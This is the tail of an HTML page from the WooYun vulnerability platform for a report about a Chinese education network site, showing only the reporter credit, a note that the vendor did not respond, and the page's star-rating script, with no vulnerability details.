										<h3 class="detailTitle">版权声明：转载请注明来源 <a style="font-weight:normal" href="http://www.wooyun.org/whitehats/盈盈无绪" title="盈盈无绪">盈盈无绪</a>@<a style="font-weight:normal" href="http://www.wooyun.org/bugs/wooyun-2010-041184" title="中国教育网系统配置漏洞导致全站沦陷">乌云</a></h3>
		<hr align="center"/>

				
			<h2>漏洞回应</h2>
			
			
									<h3 class="detailTitle">厂商回应：</h3>
										<p class="detail">未能联系到厂商或者厂商积极拒绝</p>
																	
					
		
<hr align="center" />
<script type="text/javascript">
var bugid="41184";
var bugRating="-3";
var myRating="";
var ratingCount="0";



function ShowBugRating(k){
	var ratingItems=$(".myrating span");
	$.each(ratingItems,function(i,n){
		var nk=parseInt($(n).attr("rel"));
		if(nk<=k){
			$(n).addClass("on");
		}else{
			$(n).removeClass("on");
		}
	});
	$(".myrating span").hover(
		function(){
			$("#ratingShow").html($(this).attr("data-title"));
		},
		function(){
			$("#ratingShow").html("");
		}
	);
}
$(document).ready(function(){
	if(myRating==""){
		var ratingItems=$(".myrating span");
		$(".myrating span").hover(
			function(){
				$(this).addClass("hover");
				var k=parseInt($(this).attr("rel"));
				$.each(ratingItems,function(i,n){
					var nk=parseInt($(n).attr("rel"));
					if(nk<k) $(n).addClass("on");
					if(nk>k) $(n).removeClass("on");
				});
				$("#ratingShow").html($(this).attr("data-title"));
			},
			function(){
				$(this).removeClass("hover");
				if($("#myRating").val()==""){
					$.each(ratingItems,function(i,n){
						$(n).removeClass("on");
					});
				}
				$("#ratingShow").html("");
			}
		);

		$(".myrating span").click(function(){
			var rating=$(this).attr("rel");
			var k=parseInt($(this).attr("rel"));
			$.post("/ajaxdo.php?module=bugrating",{"id":bugid,"rating":rating,"token":$("#token").val()},function(re){
				//消除操作绑定
				$(".myrating span").unbind();
				re=parseInt(re);
				switch(re){
					case 1:
						$("#ratingShow").html("评分成功");
						$("#ratingSpan").html(parseInt($("#ratingSpan").html())+1);
						$.each(ratingItems,function(i,n){
							var nk=parseInt($(n).attr("rel"));
							if(nk<=k){
								$(n).addClass("on");
							}else{
								$(n).removeClass("on");
							}
						});
						ShowBugRating(rating);
						break;
					case 2:
						$("#ratingShow").html("请先登录");
						break;
					case 4:
						$("#ratingShow").html("已对此漏洞进行过评分");
						break;
					case 6:
						$("#ratingShow").html("不能对自己发布的漏洞进行评分");
						break;
					default:break;
				}
			});
		});
	}else{
		if(ratingCount>2){
			ShowBugRating(bugRating);
		}else{
			ShowBugRating(-3);
		}
	}
});

</script>
<h3 class="detailTitle">漏洞评价：</h3>
                        </div>
                        </body>
                        </html>
